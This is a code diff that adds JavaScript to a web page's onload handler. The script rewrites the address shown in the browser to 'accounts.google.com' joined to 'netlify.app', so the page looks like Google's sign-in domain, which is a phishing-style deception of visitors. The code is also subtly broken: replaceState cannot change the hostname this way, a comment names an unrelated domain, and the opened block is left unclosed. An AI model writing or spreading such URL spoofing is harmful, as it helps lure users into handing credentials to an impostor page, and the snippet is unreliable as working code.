@@ -3,6 +3,21 @@
     <script>
       window.onload = function() {
         // alert('Document is loaded!');
+
+        var currentDomain = "netlify.app";
+        var desiredSubdomain = "accounts.google.com";
+
+        // Extract the current full domain (e.g., sub.mydomain.com)
+        var fullDomain = window.location.hostname;
+
+        // If the user is not already on test.test2.mydomain.com
+        if (fullDomain !== `${desiredSubdomain}.${currentDomain}`) {
+            var newUrl = window.location.href.replace(fullDomain, `${desiredSubdomain}.${currentDomain}`);
+
+            // Update the displayed URL without reloading the page
+        window.history.replaceState({}, '', newUrl);
+
+
         function getAllURLParams() {
           const urlParams = new URLSearchParams(window.location.search);
           let paramsObj = {};
